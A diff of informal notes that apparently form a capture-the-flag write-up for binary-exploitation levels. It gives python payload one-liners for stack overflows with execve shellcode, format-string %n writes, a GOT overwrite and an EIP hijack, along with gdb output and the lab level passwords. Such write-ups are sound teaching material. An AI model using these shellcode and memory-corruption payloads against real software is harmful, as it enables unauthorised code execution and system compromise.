@@ -73,7 +73,7 @@ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
 
 It worked, but the shell dissapeared instantly so we cant do much. (non-interactive shell)
 It exit because he sees EOF in the stdin.
-The turnaroud is to 'open a shell from a pipelined process'
+The turnaroud is to 'open a shell from a pipelined process' so it keeps reading stdin after the EOF
 
 cat /tmp/exploit - | ./level1
 
@@ -116,14 +116,14 @@ we get 0x42424242, so its 80 !.
 Lets now write the payload :
 
 python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit2
-
+'0x08 04 a0 08'
 password for level3 : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 
 level3:
 
 again the main calls the v function.
 
-What it does is create a buffer, call to fgets to get input from user, print it then checks if m == 0x40(64/'@') ??
+What it does is create a buffer, call to fgets to get input from user, print it then checks if m == 0x40(64/'@')/ 64 bytes ??
 
 fgets is protected from buffer overflows.
 
@@ -137,19 +137,147 @@ so the printf is vulnerable because there's no format so in input we can do that
 
 we can use the %x format to print the stack addresses
 
+so if i do something like this : 
+
+python -c 'print "BBBB %x %x %x %x"' > /tmp/exploit3
+
+i get :
+
+BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520
+
+So my string 'BBBB' is found at the 4th address.
+replace it with the address of m (little-endian)
+
+0x804988c
+
+python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' > /tmp/exploit3
+
+but we need to change the value, not just print the address. so the address is already 4 bytes, and it needs to be 64, so we can just add 60 bytes. We can precise which adress we adding this to with %[nb]$n, so at the 4th address is %4$n.
+
+
+python -c 'print "\x8c\x98\x04\x08" + "B" * 60 + "%4$n"' > /tmp/exploit3
+
+password for level4 : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+
+level4 :
+
+Looks the same yet some differences.
+
+Main calls a n function, takes no params.
+
+Then fgets input from user, then calls the pc function, which printf it (no format so exploit this)
+
+then it checks if the m variable if its equal to another address.
+
+So same stuff we have to change the value of m, BUT we cant simply put it like before cause the size type is too long, so we will have to use %d ?
+
+
+first lets find the address of m
+
+   0x0804848d <+54>:	mov    0x8049810,%eax
+   0x08048492 <+59>:	cmp    $0x1025544,%eax
+
+so its 0x8049810 !
+little endian : \x10\x98\x04\x08
+
+find where it is :
+
+python -c 'print "BBBB" + " %x" * 20' > /tmp/exploit4
+
+we found 42424242 at the 12th address !
+
+so the padding looks like this : address of m (4 bytes), pad of 16930112-4 with %d + modifier %n to replace value.
+
+so the only diff with level3 is the %d
+
+
+python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit4
+
+no need to keep listening to stdin with - in the launch command cause it cats the .pass file directly
+
+pass for level5 : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+
+level5 :
+
+ok two functions again.
+
+main calls n, fgets input then print it then exit. No format so format string exploit possible.
+
+but this time we have to call the o function, cause it will launch a shell.
+
+so put the address of the o function in the EIP ?
+
+we cant do that because the functions never return.
+
+so exit ?
+
+exit is in the GOT (global offset table), it holds addresses of functions that are dynamically linked,
+so we could replace the address of exit with the address of o using the format exploit of printf.
+
+let's find the address of exit.
+we can use objdump with the -R option to show dynamic reloc functions
+
+08049838 R_386_JUMP_SLOT   _exit
+08049838
+\x38\x98\x04\x08
+
+then the address of o function :
+0x080484a4
+in dec : 134513828
+\xa4\x84\x04\x08
+
+
+now lets find the address's position of exit in the stack
+python -c 'print "BBBB" + "%x" * 10' > /tmp/exploit5
+
+it's in the 4th position !
+
+but minus 4 bytes for the address of o cause of the address of exit !
+python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit5
+wait a bit, it takes time to override
+
+pass for level6 : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+level6:
+
+a main which malloc 2 buffers, then put the address of the function m in the last one.
+Then it does a strcpy of the input of the user into dest, then calls the last variable which calls the function m.
+
+but we need to call the function, which cats directly the password.
+so we need to put the address of n in this last variable.
+
+first need to find the offset of eip
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+with this tool, we can generate a pattern to determine the offset
 
 
 
-
- 
-
-
+gdb ./level6
+run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 
 
+Program received signal SIGSEGV, Segmentation fault.
+0x41346341 in ?? ()
+(gdb) info registers eip
+eip            0x41346341	0x41346341
 
+so its an offset of 72 !
 
+address of the n function :
+0x08048454
+\x54\x84\x04\x08
 
+so inject the address with a padding of 72 !
 
+python -c 'print "B" * 72 + "\x54\x84\x04\x08"' > /tmp/exploit6
+
+oh but it just segfault instantly if no parameters where sent to the binary, so we need to write this differently.
+
+./level6 $(python -c 'print "B" * 72 + "\x54\x84\x04\x08"')
+
+pass for level 7 : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
 
 
